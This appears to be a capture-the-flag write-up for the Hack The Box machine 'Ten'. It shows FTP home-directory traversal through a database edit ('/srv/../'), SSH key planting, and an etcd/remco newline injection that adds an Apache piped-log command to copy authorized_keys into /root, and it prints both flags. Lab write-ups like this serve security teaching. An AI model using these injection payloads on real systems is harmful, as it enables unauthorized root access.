### HACK THE BOX

##  Ten



#   10.129.234.158


---

<img width="869" height="240" alt="nmap" src="https://github.com/user-attachments/assets/74d48176-1bce-49e7-a0cc-f291a2adc53a" />

---


PORT 80   redirects to http://ten.htb/index.php



Ten

From Zero to Ten - your favorite free home page hoster is back after hack!

<Sign Up>


Insecure FTP Upload. WTF!

We provide upload to your account using legacy protocols. You can't feel safe but you can experience last century technology.
Static file hosting. Retro!

Like in the good old times! Fire up your Netscape Navigator 4.0 and browse your pages like in the last century! Use animated GIFs like in the 90s, upload Java applets for scrolling banners. Back to the roots!
Sounds cool? It does - we allow old-school static HTML pages ONLY. Also we can't allow .htaccess files anymore - for obvious reasons.

---


Anonymous FTP  not allowed. Hmmmm?


<img width="714" height="269" alt="ftp-fail" src="https://github.com/user-attachments/assets/26a55801-b3a3-47e2-8833-362755d5e663" />

---


Looks like we need to sign up and see what we get.

http://ten.htb/signup.php


<img width="1313" height="652" alt="sign-up" src="https://github.com/user-attachments/assets/42def6b9-418f-45e8-a619-e38a8d503b20" />

---


If we enter something into the 'Domain Name:' box and press 'Request credentials', the box seems to hang for a bit and then returns:


<img width="1226" height="627" alt="express-checkout" src="https://github.com/user-attachments/assets/30290cd8-1b1f-4c27-9aa5-f36ceb9f406f" />



username:  			ten-0311fd0e
password:			e88440db
Personal Domain: 	quill.ten.vl


That gives us the  subdomain  'ten.vl'

Add  ten.vl  and  quill.ten.vl  to  /etc/hosts

---


Now, we can access upload 'your pages' via ftp://ten.vl


Run dirbuster:


<img width="857" height="730" alt="dirsearch" src="https://github.com/user-attachments/assets/6782dd68-a206-43d3-a8e9-2949683ca787" />


---


http://ten.vl/info.php


<img width="978" height="877" alt="info-php" src="https://github.com/user-attachments/assets/21e0212f-781b-4a5a-9635-d033bbfd4778" />


---


Nothing else really of interest in /dist or on the  /attribution.php page


Let's try to log into ftp


ftp ten-0311fd0e@quill.ten.vl 

password: 		e88440db


<img width="727" height="249" alt="ftp-as-ten" src="https://github.com/user-attachments/assets/616204b7-3b0b-4522-a7c5-74844c7d9e53" />


If we visit our own webpage before running this ftp command, we get nothing, but NOW we get:


<img width="490" height="179" alt="quill-webpage" src="https://github.com/user-attachments/assets/ea05c9ad-e94f-47e5-ad07-29fb61fdd341" />


---


This clearly points towards a file upload that will then be visible on our newly created website:


Test by uploading a sample.txt file with some innocuous content:


<img width="941" height="512" alt="upload-sample" src="https://github.com/user-attachments/assets/96208f09-c11e-4958-954c-588ee7719338" />


Now check the website and see if our file is visible:


http://quill.ten.vl/sample.txt


<img width="620" height="111" alt="sample-txt" src="https://github.com/user-attachments/assets/89fd9a70-ea5a-48b7-bd1f-cb646b16b09c" />


However, if we upload a php file nothing happens:



<img width="623" height="110" alt="sample-php" src="https://github.com/user-attachments/assets/750ca810-6952-44bf-9251-db4947ac3aa3" />



---


We are kinda stuck so it's time for more enumeration. Let's try to find subdomains


<img width="938" height="532" alt="subdomains" src="https://github.com/user-attachments/assets/f03897dd-ec86-4896-b769-bd21ff7e7f6f" />


Add  webdb.ten.vl  to  /etc/hosts


---


Visit the site and we get an interesting MySQLdb website:


<img width="1912" height="385" alt="webdb" src="https://github.com/user-attachments/assets/b925665d-2c59-4dfb-9ea6-7d3df2af59c8" />


WE don't have credentials but if we push 'Guess Credentials' it prints  "Credentials found: user | pa55w0rd"  and we get this new page:


<img width="1900" height="411" alt="after-guessed-creds" src="https://github.com/user-attachments/assets/8d1f711d-4f54-4169-8fd8-91acb999dd27" />


---


If we click on the 'pureftpd' button, we get a readout of our user's information:


<img width="1915" height="245" alt="pureftpd-our-creds" src="https://github.com/user-attachments/assets/2234b7b6-0d66-4603-ab49-fb7bfa850858" />


---


If we "select" our test user (by clicking the box at the rightmost edge), we can then click the "pencil" and edit the values in the database:


<img width="1914" height="727" alt="update-data" src="https://github.com/user-attachments/assets/c851c6e9-90f9-4091-91f5-0af5f552d64a" />


The 'dir' value is most interesting. Given that this is an intentionally vulnerable box, we can maybe assume that there is an LFI here?

Let's try the standard '../../../../etc/passwd'  and see if anything shows up in our ftp server:


AH! When I try that I get an error message:

" CONSTRAINT `dir_must_start_with_slash_srv` failed for `pureftpd`.`users` "


So, try with  '/srv/../../../../../../etc/passwd'

That worked!!!

However, we get an interesting error from the ftp server:


<img width="714" height="269" alt="ftp-fail" src="https://github.com/user-attachments/assets/a6610a61-431f-43ac-a26c-707e26cdcb5b" />


What does 'Home directory not available' mean?  We must be blocked from going deep into the file structure. What if we just go up one directory to what should be the /home directory above /srv?

---


It accepts just  '/srv/../'

Now, check ftp again and,... AHA!


<img width="855" height="807" alt="base-ftp" src="https://github.com/user-attachments/assets/bcc778a0-6b40-4ac8-ab96-604e63364d9d" />


---


We can navigate inside the ftp server and grab the passwd file from /etc:


<img width="952" height="264" alt="get-passwd" src="https://github.com/user-attachments/assets/960230d0-495f-4de6-b168-7c02db410062" />


We can't grab shadow, or move into other imortant directories, so let's look at passwd:


<img width="866" height="697" alt="passwd" src="https://github.com/user-attachments/assets/05a7b402-6d67-4536-8997-21381573b7dd" />


password: 		e88440db

We have a user called 'tyrell'. Note that his UID:GID is 1000:1000.


---


If we try to change our UID to '0:0' to become 'root:root' we get an error:

"  CONSTRAINT `uid_must_be_greater_than_999` failed for `pureftpd`.`users "


So, let's try tyrell's UID:GID of 1000:1000


Now, we can get into folders that are owned by user 'tyrell'


<img width="923" height="296" alt="tyrell-dir" src="https://github.com/user-attachments/assets/defaa91e-af6c-423d-bdfa-f609f3f5832f" />


WE can't grab the .user.txt file:

ftp> get .user.txt
local: .user.txt remote: .user.txt
229 Extended Passive mode OK (|||56281|)
553 Prohibited file name: .user.txt


We CAN attempt to upload an  SSH key to the .ssh folder, no?


---


We can't actually upload from the directory when we move into /srv/../home/tyrell   but what if we move into  /srv/../home/tyrell/.ssh ??


<img width="948" height="260" alt="upload-key" src="https://github.com/user-attachments/assets/797d91b7-c059-4f39-aee7-c86de9d2370f" />


Ooooh, it looks like it worked!?


---


YES!!


<img width="833" height="317" alt="user-txt" src="https://github.com/user-attachments/assets/379b1e56-96b9-43b5-8306-946e5601b41c" />

*****************************              a0a255ad63b7a26d83467fa6e0a6a757             **********************************************


---


There isn't anything of interest in our directory and we can't access /root. I upload linpeas.sh and run it. Hmmm, not much there.


Let's look around:


<img width="930" height="254" alt="var-www-html" src="https://github.com/user-attachments/assets/9f98f9d6-3f4d-41da-9346-c515614fa088" />


What is that 'get-credentials...' file?


AH, it is pretty much just what it says.


`<?php
if ( !isset($_POST['domain']) ) {
  header('Location: /signup.php');
}
if(!preg_match('/^[0-9a-z]+$/', $_POST['domain'])) {
  echo('<font color=red>Domain name can only contain alphanumeric characters.</font>');
} else {
  $username = "ten-" . substr(hash("md5",rand()),0,8);
  $password = substr(hash("md5",rand()),0,8);
  $password_crypt = crypt($password,'$1$OWNhNDE');
  sleep(10); // This is only here so that you do not create too many users :)
  $mysqli = new mysqli("127.0.0.1", "user", "pa55w0rd", "pureftpd");
  $stmt = $mysqli->prepare("INSERT INTO users VALUES ( NULL, ?, ?, ?, ?, ? );");
  $uid = random_int(2000,65535);
  $dir = "/srv/$username/./";
  $stmt->bind_param('ssiis',$username,$password_crypt,$uid,$uid,$dir);
  $stmt->execute();
  system("ETCDCTL_API=3 /usr/bin/etcdctl put /customers/$username/url " . $_POST['domain']);
  echo('<p class="lead">Your personal account is ready to be used:<br><br>Username: <b>'.$username.'</b><br>Password: <b>'.$password.'</b><br>Personal Domain: <b>'.$_POST['domain'].'.ten.vl</b><br><br>You can use the provided credentials to upload your pages<br> via ftp://ten.vl.<br><br><font size="-1">It may take up to one minute for all backend processes to properly identify you as well as your personal virtual host to be available.</font></p>');
}`

It makes sure that the 'domain' POST parameter is set, and then redirects to 'signup.php',
It also checks for any NON-alphanumeric characters.
It creates a $username parameter by adding a random MD5 to the username 'ten-'  and also creates a random MD5 hash of 8 characters to be the $password parameter.
It accesses the MySQL database and uploads the data


Interestingly, this program goes on to call system with '/usr/bin/etcdctl'. We need to look into this 'etcd' and see what it does/


---


1)

	etcd is a distributed key-value store commonly used for configuration management, service discovery, and storing state in distributed systems (like Kubernetes clusters). It acts as a reliable, consistent database where data is replicated across multiple nodes for high availability.


2)

	etcdctl is the official command-line client tool for interacting with an etcd server. It allows operations like putting, getting, deleting, or watching keys in the store.


3)

	ETCDCTL_API=3 sets the environment variable to specify API version 3 (the modern default), then uses etcdctl to insert a key-value pair into the etcd database: the key is/customers/[username]/urland the value is the user-submitted 'domain'


4)

	This setup enables the "personal virtual host" mentioned in the output, but it might also introduce a potential vulnerability, such as path traversal or injection if the domain input isn't sanitized for etcd keys.


---


I ran pspy64 just in case anything unusual was running in the background:


<img width="942" height="263" alt="pspy64" src="https://github.com/user-attachments/assets/39b3e26f-372d-42ed-ba84-012074e52582" />


AHA, what is that? /usr/local/sbin/remco


---


remco is a lightweight configuration management tool. It's highly influenced by confd. Remcos main purposes are (like confd's):

    keeping local configuration files up-to-date using data stored in a key/value store like etcd or consul and processing template resources.
    reloading applications to pick up new config file changes


---


tyrell@ten:/etc/remco$ cat config

`log_level = "info"
log_format = "text"

[[resource]]
name = "apache2"

[[resource.template]]
  src = "/etc/remco/templates/010-customers.conf.tmpl"
  dst = "/etc/apache2/sites-enabled/010-customers.conf"
  reload_cmd = "systemctl restart apache2.service"

  [resource.backend]
    [resource.backend.etcd]
      version = 3
      nodes = ["http://127.0.0.1:2379"]
      keys = ["/customers"]
      watch = true
      interval = 5`


We need to find out what  /etc/remco/templates/010-customers.conf.tmpl  is doing as that is the file that is feeding the apache2 instance


tyrell@ten:/etc/remco$ cat /etc/remco/templates/010-customers.conf.tmpl

`{% for customer in lsdir("/customers") %}
  {% if exists(printf("/customers/%s/url", customer)) %}

<VirtualHost *:80>
        ServerName {{ getv(printf("/customers/%s/url",customer)) }}.ten.vl
        DocumentRoot /srv/{{ customer }}/
</VirtualHost>

  {% endif %}
{% endfor %}`


So, a VirtualHost (on PORT 80) is being generated for each key in the  /customers  directory. That is why we see our  'quill.ten.vl'  user pop up on PROT 80 after creating it.


---


We can try to write a new key and put it in a specific, and distinct directory, so we can see what is going on:


<img width="687" height="281" alt="new-virt" src="https://github.com/user-attachments/assets/c098d5a3-055d-4a60-aa86-7bb20704cd2d" />


BOOM!!  We have a new VirtualHost with our  specified  'ServerName' and 'DocumentRoot'


---


Now, the trick here is to check to see if we can insert newlines into the config file. If we can, we will be able to put  a command  'between' the 'ServerName' and  'DocumentRoot' parameters.


Use our legit user (ten-0311fd0e) to make sure that we can perform the privesc operation:


<img width="869" height="83" alt="test" src="https://github.com/user-attachments/assets/b6f1c241-69b9-4517-9151-1b6a8ca1f7c0" />

Ooooh, looks like it works!!


BOOM!!

<img width="914" height="282" alt="boom" src="https://github.com/user-attachments/assets/24405dd4-f4c2-4450-96c0-a1c186792414" />


---

Now, we need to find something that can get us execution, OR allow us to upload a file to the server. We settle on 'Piped Logs'


Piped Logs

Apache httpd is capable of writing error and access log files through a pipe to another process, rather than directly to a file. This capability dramatically increases the flexibility of logging, without adding code to the main server. In order to write logs to a pipe, simply replace the filename with the pipe character "|", followed by the name of the executable which should accept log entries on its standard input. The server will start the piped-log process when the server starts, and will restart it if it crashes while the server is running. (This last feature is why we can refer to this technique as "reliable piped logging".)

Piped log processes are spawned by the parent Apache httpd process, and inherit the userid of that process. This means that piped log programs usually run as root. It is therefore very important to keep the programs simple and secure.

One important use of piped logs is to allow log rotation without having to restart the server. The Apache HTTP Server includes a simple program called rotatelogs for this purpose. For example, to rotate the logs every 24 hours, you can use:

CustomLog "|/usr/local/apache/bin/rotatelogs /var/log/access_log 86400" common

Notice that quotes are used to enclose the entire command that will be called for the pipe. Although these examples are for the access log, the same technique can be used for the error log.

As with conditional logging, piped logs are a very powerful tool, but they should not be used where a simpler solution like off-line post-processing is available.

By default the piped log process is spawned without invoking a shell. Use "|$" instead of "|" to spawn using a shell (usually with /bin/sh -c):

# Invoke "rotatelogs" using a shell


`CustomLog "|$/usr/local/apache/bin/rotatelogs   /var/log/access_log 86400" common`


---

So, our best option looks like trying to  transfer our  'authorized_keys' file from  our tyrell user  to  the root user.  (We need to put in an actual user name so that the structure is correct, just in case)


ETCDCTL_API=3 etcdctl put /customers/ten-0311fd0e/url 'privesc.ten.vl
CustomLog "|$cp /home/tyrell/.ssh/authorized_keys /root/.ssh/authorized_keys" common
#'


<img width="839" height="81" alt="privesc" src="https://github.com/user-attachments/assets/f4c5d560-974c-42ca-8846-d5ff9c91cf0c" />


Now, ssh in as root with the ed25519 key we made previously


<img width="911" height="271" alt="root-flag" src="https://github.com/user-attachments/assets/c9bcf1b6-db37-4d4d-9915-a11695336176" />


**********************************          d89266bde1e8cfe1cd70194bd899d2e7        ************************************
